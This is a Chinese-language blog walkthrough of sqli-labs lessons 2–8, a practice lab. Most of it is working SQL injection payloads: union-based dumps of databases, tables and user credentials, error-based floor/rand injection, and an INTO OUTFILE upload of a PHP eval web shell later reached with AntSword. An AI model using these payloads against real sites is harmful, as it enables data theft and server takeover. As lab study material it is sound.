&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;爆库，第二个字段拼接改连接所有数据库名：http://www.sqli-labs.com/Less-2?id=-1 union select 1,group_concat(schema_name),3 from information_schema.schemata爆当前数据库的表：http://www.sqli-labs.com/Less-2?id=-1 union select 1,group_concat(table_name),3 from information_schema.tables where database()=table_schema爆字段：http://www.sqli-labs.com/Less-2?id=-1 union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&amp;#x27;users&amp;#x27;爆字段值：http://www.sqli-labs.com/Less-2?id=-1 union select 1,group_concat(concat_ws(&amp;#x27;--&amp;#x27;,username,password)),3 from users&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h2 id=&#34;总结-2&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#总结-2&#34;&gt;#&lt;/a&gt; 总结&lt;/h2&gt;
&lt;p&gt;想当年我还是个不管写什么题目都要看通关手册的人，鼓掌！！！&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id=&#34;less-3&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#less-3&#34;&gt;#&lt;/a&gt; Less-3&lt;/h1&gt;
&lt;p&gt;date:2020-11-17 11:00:04&lt;/p&gt;
&lt;h2 id=&#34;过程-3&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#过程-3&#34;&gt;#&lt;/a&gt; 过程&lt;/h2&gt;
&lt;h3 id=&#34;sqlmap-3&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#sqlmap-3&#34;&gt;#&lt;/a&gt; sqlmap&lt;/h3&gt;
&lt;p&gt;同 Less-1&lt;/p&gt;
&lt;h3 id=&#34;手工注入-3&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#手工注入-3&#34;&gt;#&lt;/a&gt; 手工注入&lt;/h3&gt;
&lt;p&gt;加单引号报错，看后面具体要闭合啥&lt;/p&gt;
&lt;p&gt;payload:&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;http://www.sqli-labs.com/Less-3?id=1asdf&amp;#x27;kkkk&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;输出，发现后面有括号啥的闭合一下，并且 id 也是字符型的：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &amp;#x27;kkkk&amp;#x27;) LIMIT 0,1&amp;#x27; at line 1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;根据 order by 判断需要的字段数是 3 个&lt;/p&gt;
&lt;p&gt;payload:&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;http://www.sqli-labs.com/Less-3?id=-1&amp;#x27;) order by 4 --+http://www.sqli-labs.com/Less-3?id=-1&amp;#x27;) order by 3 --+&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;脱脱脱：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;爆库，第二个字段拼接改连接所有数据库名：http://www.sqli-labs.com/Less-3?id=-1&amp;#x27;) union select 1,group_concat(schema_name),3 from information_schema.schemata --+爆当前数据库的表：http://www.sqli-labs.com/Less-3?id=-1&amp;#x27;) union select 1,group_concat(table_name),3 from information_schema.tables where database()=table_schema --+爆字段：http://www.sqli-labs.com/Less-3?id=-1&amp;#x27;) union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&amp;#x27;users&amp;#x27; --+爆字段值：http://www.sqli-labs.com/Less-3?id=-1&amp;#x27;) union select 1,group_concat(concat_ws(&amp;#x27;--&amp;#x27;,username,password)),3 from users --+&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h2 id=&#34;总结-3&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#总结-3&#34;&gt;#&lt;/a&gt; 总结&lt;/h2&gt;
&lt;p&gt;?id=1&amp;quot; 竟然正常返回信息了！！！&lt;/p&gt;
&lt;p&gt;因为 id=xx (‘1&amp;quot;’) 了啊，根本没闭合啊，有点弱智哦&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id=&#34;less-4&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#less-4&#34;&gt;#&lt;/a&gt; Less-4&lt;/h1&gt;
&lt;p&gt;date:2020-11-17 11:25:45&lt;/p&gt;
&lt;h2 id=&#34;过程-4&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#过程-4&#34;&gt;#&lt;/a&gt; 过程&lt;/h2&gt;
&lt;h3 id=&#34;sqlmap-4&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#sqlmap-4&#34;&gt;#&lt;/a&gt; sqlmap&lt;/h3&gt;
&lt;p&gt;同 Less-1&lt;/p&gt;
&lt;h3 id=&#34;手工注入-4&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#手工注入-4&#34;&gt;#&lt;/a&gt; 手工注入&lt;/h3&gt;
&lt;p&gt;发现双引号报错，所以可以直接在后面加 &amp;quot;) %23+ 进行闭合&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;http://www.sqli-labs.com/Less-4?id=1&amp;quot;You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &amp;#x27;&amp;quot;1&amp;quot;&amp;quot;) LIMIT 0,1&amp;#x27; at line 1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;根据 order by 确定是三个字段后，union select 拿数据&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;爆库，第二个字段拼接改连接所有数据库名：http://www.sqli-labs.com/Less-4?id=-1&amp;quot;) union select 1,group_concat(schema_name),3 from information_schema.schemata --+爆当前数据库的表：http://www.sqli-labs.com/Less-4?id=-1&amp;quot;) union select 1,group_concat(table_name),3 from information_schema.tables where database()=table_schema --+爆字段：http://www.sqli-labs.com/Less-4?id=-1&amp;quot;) union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&amp;#x27;users&amp;#x27; --+爆字段值：http://www.sqli-labs.com/Less-4?id=-1&amp;quot;) union select 1,group_concat(concat_ws(&amp;#x27;--&amp;#x27;,username,password)),3 from users --+&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h2 id=&#34;总结-4&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#总结-4&#34;&gt;#&lt;/a&gt; 总结&lt;/h2&gt;
&lt;p&gt;没啥好说的&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id=&#34;less-5&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#less-5&#34;&gt;#&lt;/a&gt; Less-5&lt;/h1&gt;
&lt;p&gt;date:2020-11-17 11:48:40&lt;/p&gt;
&lt;h2 id=&#34;过程-5&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#过程-5&#34;&gt;#&lt;/a&gt; 过程&lt;/h2&gt;
&lt;h3 id=&#34;sqlmap-5&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#sqlmap-5&#34;&gt;#&lt;/a&gt; sqlmap&lt;/h3&gt;
&lt;p&gt;同 Less-1&lt;/p&gt;
&lt;h3 id=&#34;手工注入-5&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#手工注入-5&#34;&gt;#&lt;/a&gt; 手工注入&lt;/h3&gt;
&lt;p&gt;单引号报错，payload&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;http://www.sqli-labs.com/Less-5?id=1&amp;#x27;You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &amp;#x27;&amp;#x27;1&amp;#x27;&amp;#x27; LIMIT 0,1&amp;#x27; at line 1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;‘‘1’’ LIMIT 0,1’第一个单引号真的巨坑，总是眼糊看错成 SQL 语句里面的&lt;/p&gt;
&lt;p&gt;闭合单引号，用 order by 确定是提取了三个字段，但是页面上并没有输出字段的值，目测是后台进行了判断&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;http://www.sqli-labs.com/Less-5?id=1&amp;#x27; order by 3 +%23+输出：You are in...........&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;前端没有发现啥有用的东西，撸了一下 floor 报错，开干&lt;/p&gt;
&lt;p&gt;爆库 payload&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;http://www.sqli-labs.com/Less-5?id=1&amp;#x27; AND(SELECT 1 FROM(SELECT COUNT(*),CONCAT(database(),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)AND &amp;#x27;1&amp;#x27;=&amp;#x27;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;然后像以前一样的流程，在 concat 里面找自己要的数据就好了&lt;/p&gt;
&lt;h2 id=&#34;总结-5&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#总结-5&#34;&gt;#&lt;/a&gt; 总结&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;&lt;a href=&#34;https://www.cnblogs.com/litlife/p/8472323.html&#34;&gt;select count (*) from test group by floor (rand (0)*2) 报错原理 666&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;概括一下:&lt;/p&gt;
&lt;p&gt;floor (rand (0)*2) 是随机 0、1，但是是伪随机 011011…&lt;/p&gt;
&lt;p&gt;count (*) 与 group by 共同工作时会建立一张虚拟表，两个字段 (关键字和数量)&lt;/p&gt;
&lt;p&gt;floor 表达式第一次运算的值为 0，在表中没有找到 key 为 0 的数据，故插入，在插入的过程中需要再取一次 group by 后面的值（即再进行一次 floor 运算，结果为 1），取到了 1，将之插入，并将 count (*) 置 1。&lt;/p&gt;
&lt;p&gt;也就是说一次插入要调用两次 floor，所以在后面碰见 01 时，0 没有，插入 1，但是 1 已经存在，报错&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;payload 是 sqlmap 复制后修改的，自己手动输入的总是说有语法错，我对着看了好多遍感觉没有什么问题啊，无理取闹，后来看报错应该是 and 后面的 select from 的表要别名 (Every derived table must have its own alias)，select from 外面还要加一个括号&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;hr&gt;
&lt;h1 id=&#34;less-6&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#less-6&#34;&gt;#&lt;/a&gt; Less-6&lt;/h1&gt;
&lt;p&gt;data: 2020-11-17 15:50:40&lt;/p&gt;
&lt;h2 id=&#34;过程-6&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#过程-6&#34;&gt;#&lt;/a&gt; 过程&lt;/h2&gt;
&lt;h3 id=&#34;sqlmap-6&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#sqlmap-6&#34;&gt;#&lt;/a&gt; sqlmap&lt;/h3&gt;
&lt;p&gt;同 Less-1&lt;/p&gt;
&lt;h3 id=&#34;手工注入-6&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#手工注入-6&#34;&gt;#&lt;/a&gt; 手工注入&lt;/h3&gt;
&lt;p&gt;输入了 less-5 里面的 payload，发现不报错了！&lt;/p&gt;
&lt;p&gt;机智的我去看 sqlmap 发现就是变成了闭合双引号罢了唉，人傻了&lt;/p&gt;
&lt;p&gt;爆当前库 payload:&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;http://www.sqli-labs.com/Less-6?id=1&amp;quot; AND(SELECT 1 FROM(SELECT COUNT(*),CONCAT(database(),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)AND &amp;#x27;1&amp;#x27;=&amp;quot;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;CONCAT (payload,floor (rand (0)*2)) 作为 group by 的 key&lt;/p&gt;
&lt;h2 id=&#34;总结-6&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#总结-6&#34;&gt;#&lt;/a&gt; 总结&lt;/h2&gt;
&lt;p&gt;没啥好总结的，还以为又有新东西可以看了&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id=&#34;less-7&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#less-7&#34;&gt;#&lt;/a&gt; Less-7&lt;/h1&gt;
&lt;p&gt;date:2020-11-17 16:09:39&lt;/p&gt;
&lt;h2 id=&#34;过程-7&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#过程-7&#34;&gt;#&lt;/a&gt; 过程&lt;/h2&gt;
&lt;h3 id=&#34;sqlmap-7&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#sqlmap-7&#34;&gt;#&lt;/a&gt; sqlmap&lt;/h3&gt;
&lt;p&gt;同 Less-1&lt;/p&gt;
&lt;p&gt;sqlmap 用的时间盲注，它自己跑着跑着连接就断了，笑死&lt;/p&gt;
&lt;h3 id=&#34;手工注入-7&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#手工注入-7&#34;&gt;#&lt;/a&gt; 手工注入&lt;/h3&gt;
&lt;p&gt;试了一些，目测后台做了判断&lt;/p&gt;
&lt;p&gt;sql 报错统一输出：&lt;/p&gt;
&lt;p&gt;You have an error in your SQL syntax&lt;/p&gt;
&lt;p&gt;正常输出：You are in… Use outfile…&lt;/p&gt;
&lt;p&gt;盲注的话，二分法判断字符的 ascii 码值，sqlmap 都说它扛不住了&lt;/p&gt;
&lt;p&gt;看见正常输出那里有个 use outfile…，感觉是个提示，新东西就要百度看看，好叭这里直接看通关秘籍了，竟然直接写入文件 getshell 了…&lt;/p&gt;
&lt;p&gt;太帅了，动手撸一遍&lt;/p&gt;
&lt;p&gt;要上传一句话连接的话，需要知道路径，去有回显的题拿路径啦&lt;/p&gt;
&lt;p&gt;basedir 参数指定了安装 MySQL 的安装路径&lt;/p&gt;
&lt;p&gt;datadir 参数指定了 MySQL 的数据库文件放在什么路径下&lt;/p&gt;
&lt;p&gt;payload:&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;http://www.sqli-labs.com/Less-1/?id=-1&amp;#x27; union select 1,@@datadir,@@basedir MYSQL %23+&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;输出，并没有 phpstudy 的路径，因为我根本没用 phpstudy 的数据库…：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;Your Login name:C:\ProgramData\MySQL\MySQL Server 5.5\Data\Your Password:C:/Program Files (x86)/MySQL/MySQL Server 5.5/&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;尝试在获取到的路径下存入 php 一句话：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;http://www.sqli-labs.com/Less-7/?id=1 union select &amp;#x27;&amp;lt;?php eval(@_POST[&amp;quot;haha&amp;quot;]); ?&amp;gt;&amp;#x27; into outfile &amp;#x27;C:/ProgramData/MySQL/MySQL Server 5.5/Data/haha.php&amp;#x27; %23+&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;但是一直报错，愤怒地直接去 mysql 运行的时候，发现报错：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;[SQL] select &amp;#x27;&amp;lt;?php eval(@_POST[&amp;quot;haha&amp;quot;]); ?&amp;gt;&amp;#x27; into outfile &amp;#x27;C:/haha.php&amp;#x27;[Err] 1290 - The MySQL server is running with the --secure-file-priv option so it cannot execute this statement&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;去查了一下报错原因：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;将桌面文件存储到mysql时报错：The MySQL server is running with the --secure-file-pri option so it cannot execute this.&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;报错原因：mysql文件的导入和导出路径有默认的设置，即 secure-file-priv,当传入的csv文件路径与默认的路径冲突时就会报错。&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;secure-file-priv的值有三种情况：secure_file_prive=null ––限制mysqld 不允许导入导出&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;secure_file_priv=/path/ – --限制mysqld的导入导出只能发生在默认的/path/目录下&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;secure_file_priv=’’ – --不对mysqld 的导入 导出做限制&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;通过命令  &lt;code&gt;select @@secure_file_priv&lt;/code&gt;  查询，发现 secure_file_priv 的值为 null，也就是说不允许导入导出&lt;/p&gt;
&lt;p&gt;于是到 mysql 的安装目录下修改 my.ini 配置文件，在 mysqld 节点下加入 secure_file_priv=’’，对导入导出不进行限制&lt;/p&gt;
&lt;p&gt;在尝试 payload 时，&lt;/p&gt;
&lt;p&gt;?id=1 order by 111111 %23 + 不报错&lt;/p&gt;
&lt;p&gt;?id=1’ order by 111111 %23 + 报错&lt;/p&gt;
&lt;p&gt;?id=1&amp;quot; order by 111111 %23 + 不报错&lt;/p&gt;
&lt;p&gt;说明有一个单引号要闭合&lt;/p&gt;
&lt;p&gt;?id=1’ order by 1 %23 + 报错&lt;/p&gt;
&lt;p&gt;?id=1’)) order by 3 %23 + 不报错&lt;/p&gt;
&lt;p&gt;?id=1’)) order by 4 %23 + 报错&lt;/p&gt;
&lt;p&gt;闭合成功，且需要三个字段&lt;/p&gt;
&lt;p&gt;payload：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;http://www.sqli-labs.com/Less-7?id=1&amp;#x27;)) union select &amp;#x27;&amp;lt;?php @eval($_POST[&amp;quot;haha&amp;quot;]); ?&amp;gt;&amp;#x27;,2,3 into outfile &amp;#x27;D:/haha.php&amp;#x27; %23+&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;虽然输出还是报错，但是文件已经上传到 D 盘了（因为这个 sql 语句我已经在数据库试了很多遍了…）&lt;/p&gt;
&lt;p&gt;但是因为我的 mysql 不是 PHPstudy 的，所以没有搞到 phpstudy 的路径，没有上传到 phpstudy 目录下，也连接不上解析不了？&lt;/p&gt;
&lt;p&gt;机智的我决定手动复制到 www 下&lt;/p&gt;
&lt;p&gt;上蚁剑连接成功&lt;/p&gt;
&lt;p&gt;另外要看数据库数据的话可以通过改上面的 p 输出文件，然后上蚁剑查看输出的文件内容，其余的爆数据库和之前的题目都一样的流程，例如爆当前数据库名：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;http://www.sqli-labs.com/Less-7?id=1&amp;#x27;)) union select database(),2,3 into outfile &amp;#x27;D:/haha.php&amp;#x27; %23+&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;因为用命令行登录数据库需要密码&lt;/p&gt;
&lt;h3 id=&#34;总结-7&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#总结-7&#34;&gt;#&lt;/a&gt; 总结&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;MySQL 的 @与 @@区别&lt;/p&gt;
&lt;p&gt;@x 是 用户自定义的变量 (User variables are written as @var_name)&lt;/p&gt;
&lt;p&gt;@@x 是 global 或 session 变量 (@@global @@session)&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;菜鸡的悲哀就是做个题还要靠作弊（菜菜子不要难过！你会变强的！）&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;hr&gt;
&lt;h1 id=&#34;less-8&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#less-8&#34;&gt;#&lt;/a&gt; Less-8&lt;/h1&gt;
&lt;p&gt;date:2020-11-21 13:58:47&lt;/p&gt;
&lt;h2 id=&#34;过程-8&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#过程-8&#34;&gt;#&lt;/a&gt; 过程&lt;/h2&gt;
&lt;h3 id=&#34;sqlmap-8&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#sqlmap-8&#34;&gt;#&lt;/a&gt; sqlmap&lt;/h3&gt;
&lt;p&gt;同 less-1，看见 sqlmap 的 payload，它也是盲注咯&lt;/p&gt;
&lt;h3 id=&#34;手工注入-8&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#手工注入-8&#34;&gt;#&lt;/a&gt; 手工注入&lt;/h3&gt;
&lt;p&gt;单引号闭合后分别 order by 3 和 4，发现一个正常输出一个不输出，说明单引号闭合成功，order by 执行成功，且需要三个字段，payload：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;http://www.sqli-labs.com/Less-8?id=1&amp;#x27; order by 3 %23+http://www.sqli-labs.com/Less-8?id=1&amp;#x27; order by 4 %23+&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;没有回显数据，只能盲注&lt;/p&gt;
&lt;p&gt;尝试第七关的 outfile 上传文件，上传成功，上蚁剑连接&lt;/p&gt;
&lt;p&gt;换个思路，上盲注，看题目是布尔盲注，一个一个猜呗，机智的我决定先测试出长度再上 bp 爆&lt;/p&gt;
&lt;p&gt;length () 函数，显而易见是返回里面参数的长度&lt;/p&gt;
